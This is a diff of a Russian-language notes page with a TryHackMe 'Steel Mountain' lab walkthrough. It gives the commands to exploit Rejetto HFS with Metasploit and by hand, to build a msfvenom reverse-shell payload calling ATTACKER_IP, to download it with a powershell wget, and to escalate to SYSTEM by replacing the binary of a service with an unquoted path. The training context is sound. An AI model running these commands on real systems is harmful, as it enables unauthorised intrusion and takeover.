@@ -18,7 +18,7 @@
         <link rel="prev" href="../Pickle_Rick/">
       
       
-        <link rel="next" href="../../CyberSec/">
+        <link rel="next" href="../Upload_Vulnerabilities/">
       
       <link rel="icon" href="../../images/favicon.png">
       <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-9.1.0">
@@ -492,9 +492,54 @@
         
       
       
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Steel Mountain
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
       <a href="./" class="md-nav__link md-nav__link--active">
         Steel Mountain
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Содержание раздела">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Содержание раздела
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    Разведка и сканирование
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#metasploit" class="md-nav__link">
+    Используем metasploit
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#metasploit_1" class="md-nav__link">
+    Без использования metasploit
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
       
     </li>
   
@@ -507,7 +552,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Upload_Vulnearbilities.md" class="md-nav__link">
+      <a href="../Upload_Vulnerabilities/" class="md-nav__link">
         Upload Vulnerabilities
       </a>
     </li>
@@ -1986,6 +2031,35 @@
     
   
   
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Содержание раздела
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    Разведка и сканирование
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#metasploit" class="md-nav__link">
+    Используем metasploit
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#metasploit_1" class="md-nav__link">
+    Без использования metasploit
+  </a>
+  
+</li>
+      
+    </ul>
+  
 </nav>
                   </div>
                 </div>
@@ -2001,50 +2075,73 @@
 
 <h1 id="steel-mountain">Steel Mountain</h1>
 <hr />
-<p><a href="https://tryhackme.com/room/steelmountain">https://tryhackme.com/room/steelmountain</a>
-Основная задача - внедрение в Windows машину через metasploit и без него. Использование скриптов для поиска возможности эскалации привилегий Windows. Эскалация привилегий в Windows</p>
+<p>Основная задача - внедрение в Windows машину через <a href="/CyberSec/Tools/Metasploit.md">metasploit</a> и без него. Использование скриптов для поиска возможности эскалации привилегий Windows, эскалация привилегий в Windows.<br />
+Описание задания можно найти на <a href="https://tryhackme.com/room/steelmountain">TryHackme</a></p>
+<h3 id="_1">Разведка и сканирование</h3>
+<p>Смотрим source сайта.  </p>
+<blockquote>
+<p>Находим первый флаг - имя файла с лучшим работником.<br />
+На 8080 порту админка HFS - <a href="https://www.rejetto.com/hfs/">Http file server</a></p>
+</blockquote>
+<p>Проведение разведки с nmap на предмет наличия открытых портов:</p>
+<div class="language-Bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-T<span class="w"> </span><span class="m">4</span><span class="w"> </span><span class="nv">$IP</span>-ADDRESS
+</span></code></pre></div>
+<blockquote>
+<p>Обнаружены открытые порты 135,80,445,3389,8080,139,49155,47001,5985,49169,49156,49154,49153,49168 </p>
+</blockquote>
+<p>Сканируем со стандартными скриптами для определения версий сервисов, ПО и прочей информации:
+<div class="language-Bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-A<span class="w"> </span><span class="m">135</span>,80,445,3389,8080,139,49155,47001,5985,49169,49156,49154,49153,49168<span class="w"> </span><span class="nv">$IP</span>-ADDRESS
+</span></code></pre></div></p>
+<blockquote>
+<p>Получаем сведения о версии HFS. В случае атаки без использования <code>metasploit</code> ищем на exploit-db эксплойт для имеющейся версии rejetto HFS. </p>
+</blockquote>
+<h3 id="metasploit">Используем metasploit</h3>
+<div class="language-Bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>msfconsole<span class="w"> </span>search<span class="w"> </span>hfs<span class="w"> </span><span class="c1"># Ищем в metasploit эксплойт по ключевому слову - названию сервера  </span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>use<span class="w"> </span>exploit/windows/http/rejetto_hfs_exec<span class="w"> </span><span class="c1"># Выбираем нужный эксплойт  </span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="nb">set</span><span class="w"> </span>RHOSTS<span class="w"> </span>and<span class="w"> </span>RPORT<span class="w"> </span><span class="c1"># Определяем необходимые переменные  </span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>exploit<span class="w"> </span><span class="c1"># Получаем доступ к cmd целевой системы с правами пользователя от имени которого запущен и управляется HFS  </span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>search<span class="w"> </span>user.txt<span class="w"> </span><span class="c1"># Ищем userflag</span>
+</span></code></pre></div>
+<blockquote>
+<p>Попытка эскалировать права с помощью getsystem обернулась неудачей.
+Для поиска возможности эскалации прав используем PS скрипт для сбора информации о Windows системе - <code>PowerUp.ps1</code> из фреймворка <a href="https://github.com/PowerShellMafia/PowerSploit">PowerSploit</a></p>
+</blockquote>
+<div class="language-Bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>upload<span class="w"> </span>PowerUp.ps1<span class="w"> </span><span class="c1"># Загружаем скрипт на машину</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>load<span class="w"> </span>powershell<span class="w"> </span><span class="c1"># Загружает модуль powershell для того, чтобы в последствии вызвать PS консоль</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>powershell_shell<span class="w"> </span><span class="c1"># Вызовет такую консоль``</span>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>.<span class="w"> </span>.<span class="se">\P</span>owerUp.ps1<span class="w"> </span><span class="c1"># не забываем про точку перед .\</span>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>Invoke-AllChecks<span class="w"> </span><span class="c1"># Запускаем скрипт. Изучаем его вывод.</span>
+</span></code></pre></div>
+<blockquote>
+<p>Обращаем внимание на сервисы которые могут быть перезапущены текущим пользователем (<code>CanRestart True</code>) и имеют "незакавыченные" пути к исполняемым файлам. Это позволит нам остановить такой сервис, подменить его исполняемый файл на нужный нам, а затем заново запустить сервис.</p>
+</blockquote>
+<p><img alt="Result of work PowerUp.ps1" src="/images/steel_mountain_1.png" /></p>
+<p>Создаем payload в msfvenom:</p>
+<p><div class="language-Bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>ATTACKER_IP<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4443</span><span class="w"> </span>-e<span class="w"> </span>x86/shikata_ga_nai<span class="w"> </span>-f<span class="w"> </span>exe-service<span class="w"> </span>-o<span class="w"> </span><span class="nv">$SERVICE_NAME</span>.exe
+</span></code></pre></div>
+Останавливаем нужный сервис
+<div class="language-Bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>sc<span class="w"> </span>stop<span class="w"> </span><span class="nv">$SERVICE_NAME</span>
+</span></code></pre></div></p>
+<p>Загружаем payload с помощью <code>upload</code> подменяя экзешник сервиса.<br />
+Запускаем сервис <code>(sc start $SERVICE_NAME)</code> и ловим его на локальный netcat <code>(nc -lvnp 4443)</code>- получаем cmd с <code>NT_AUTHORITY</code> правами.</p>
+<h3 id="metasploit_1">Без использования metasploit</h3>
+<p>Получаем уязвимость на <a href="https://www.exploit-db.com/exploits/39161">exploit-db</a>.<br />
+Алгоритм работы скрипта реализующего уязвимости заключается в следующем:</p>
 <ol>
-<li>Смотрим source сайта. Находим первый флаг - имя файла с лучшим работником.</li>
+<li>При первом запуске он подключается к HFS по указанному адресу, а затем стучится на <code>http://$ATTACKER_IP:80</code> для того, чтобы скачать <code>nc.exe</code> (бинарник netcat).  </li>
+<li>При втором запуске открывается cmd с правами пользователя запустившего HFS.</li>
 </ol>
-<p>На 8080 порту админка HFS (Http file server - <a href="https://www.rejetto.com/hfs/">https://www.rejetto.com/hfs/</a>)</p>
-<ol>
-<li>Проведение разведки с nmap на предмет наличия открытых портов:</li>
-</ol>
-<p><code>sudo nmap -T 4 $IP-ADDRESS #</code>Обнаружены открытые порты 135,80,445,3389,8080,139,49155,47001,5985,49169,49156,49154,49153,49168 
-3.Сканируем со стандартными скриптами для определения версий сервисов, ПО и прочей информации:
-<code>sudo nmap -A 135,80,445,3389,8080,139,49155,47001,5985,49169,49156,49154,49153,49168 $IP-ADDRESS</code>
-Получаем сведения о версии HFS. В случае атаки без использования metasploit ищем на exploit-db эксплойт для имеющейся версии rejetto HFS, 
-Используем metasploit:</p>
-<p>a. <code>msfconsole search hfs # Ищем в metasploit эксплойт по ключевому слову - названию сервера</code>
-b. <code>use exploit/windows/http/rejetto_hfs_exec # Выбираем нужный эксплойт</code>
-c. <code>set RHOSTS and RPORT # Определяем необходимые переменные</code>
-d. <code>exploit # Получаем доступ к cmd целевой системы с правами пользователя от имени которого запущен и управляется HFS</code>
-e. <code>search user.txt # Ищем userflag</code>
-f. Попытка эскалировать права с помощью getsystem обернулась неудачей.
-g. Для поиска возможности эскалации прав используем PS скрипт для сбора информации о Windows системе - <strong>PowerUp.ps1</strong> из фреймворка <a href="https://github.com/PowerShellMafia/PowerSploit">PowerSploit</a>
-h. <code>upload PowerUp.ps1</code> <code># Загружаем скрипт на машину</code>
-i. <code>load powershell # Загружает модуль powershell для того, чтобы в последствии вызвать PS консоль</code>
-j. <code>powershell_shell # Вызовет такую консоль</code>
-k. <code>. .\PowerUp.ps1</code>
-l. <code>Invoke-AllChecks</code> <code># Запускаем скрипт (не забываем про точку перед .\). Изучаем его вывод.</code>
-m. Обращаем внимание на сервисы которые могут быть перезапущены текущим пользователем (<strong>CanRestart True</strong>) и имеют "незакавыченные" пути к исполняемым файлам. Это позволит нам остановить службу, подменить её на нужный файл, а затем заново запустить службу.
-n. Создаем payload в msfvenom:</p>
-<p><code>msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o $SERVICE_NAME.exe</code></p>
-<p>o. Останавливаем нужный сервис <code>sc stop $SERVICE_NAME</code>
-p. Загружаем payload с помощью upload подменяя экзешник сервиса.
-q. Запускаем сервис <code>(sc start $SERVICE_NAME)</code> и ловим его на локальный netcat <code>(nc -lvnp 4443)</code>- получаем cmd с NT_AUTHORITY правами.</p>
-<p>Без использования metasploit:</p>
-<p>a. Получаем уязвимость на <a href="https://www.exploit-db.com/exploits/39161">exploit-db</a>.
-b. Алгоритм работы скрипта заключается в следующем:
-    1. При первом запуске он подключается к HFS по указанному адресу, а затем стучится на http://$ATTACKER_IP:80 для того, чтобы скачать nc.exe (бинарник netcat).
-    2. При втором запуске открывается cmd с правами пользователя запустившего HFS.
-c. Следовательно, для работы скаченного скрипта нужен бинарник netcat-a (можно взять <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe">здесь</a> не забыв переименовать в nc.exe) и web сервер на 80 порту, с которого можно будет забрать nc.exe <code>(python3 -m http.server 80</code>)
-d. Создаем payload в msfvenom:</p>
-<p><code>msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o $SERVICE_NAME.exe</code></p>
-<p>e. Загружаем payload:</p>
-<p><code>powershell -c wget "</code><a href="http://10.14.37.38/$SERVICE_NAME.exe"><code>http://10.14.37.38/$SERVICE_NAME.exe</code></a><code>-OutFile $SERVICE_NAME.exe"</code></p>
-<p>f. Останавливаем нужный сервис <code>sc stop $SERVICE_NAME</code>
-g. Запускаем сервис <code>(sc start $SERVICE_NAME)</code>и ловим его на локальный netcat <code>(nc -lvnp 4443)</code>- получаем cmd с NT_AUTHORITY правами. </p>
+<p>Следовательно, для работы скаченного скрипта нужен бинарник <code>netcat</code> (можно взять <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe">здесь</a> не забыв переименовать в <code>nc.exe</code>) и web сервер на 80 порту, с которого можно будет забрать <code>nc.exe</code> </p>
+<p><div class="language-Bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">80</span>
+</span></code></pre></div>
+Создаем payload в msfvenom:</p>
+<div class="language-Bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>ATTACKER_IP<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4443</span><span class="w"> </span>-e<span class="w"> </span>x86/shikata_ga_nai<span class="w"> </span>-f<span class="w"> </span>exe-service<span class="w"> </span>-o<span class="w"> </span><span class="nv">$SERVICE_NAME</span>.exe
+</span></code></pre></div>
+<p>Загружаем payload:</p>
+<p><div class="language-Powershell highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="n">powershell</span> <span class="n">-c</span> <span class="nb">wget </span><span class="s2">&quot;</span><span class="se">``</span><span class="s2">[</span><span class="se">``</span><span class="s2">http://10.14.37.38/$SERVICE_NAME.exe</span><span class="se">``</span><span class="s2">](http://10.14.37.38/$SERVICE_NAME.exe)</span><span class="se">``</span><span class="s2"> -OutFile $SERVICE_NAME.exe&quot;</span>
+</span></code></pre></div>
+Останавливаем нужный сервис <code>sc stop $SERVICE_NAME</code>.<br />
+Запускаем сервис <code>(sc start $SERVICE_NAME)</code> и ловим его на локальный netcat <code>nc -lvnp 4443</code>- получаем cmd с <code>NT_AUTHORITY</code> правами. </p>
 
 
 
@@ -2087,13 +2184,13 @@ g. Запускаем сервис <code>(sc start $SERVICE_NAME)</code>и ло�
         
         
           
-          <a href="../../CyberSec/" class="md-footer__link md-footer__link--next" aria-label="Вперед: CyberSec" rel="next">
+          <a href="../Upload_Vulnerabilities/" class="md-footer__link md-footer__link--next" aria-label="Вперед: Upload Vulnerabilities" rel="next">
             <div class="md-footer__title">
               <div class="md-ellipsis">
                 <span class="md-footer__direction">
                   Вперед
                 </span>
-                CyberSec
+                Upload Vulnerabilities
               </div>
             </div>
             <div class="md-footer__button md-icon">
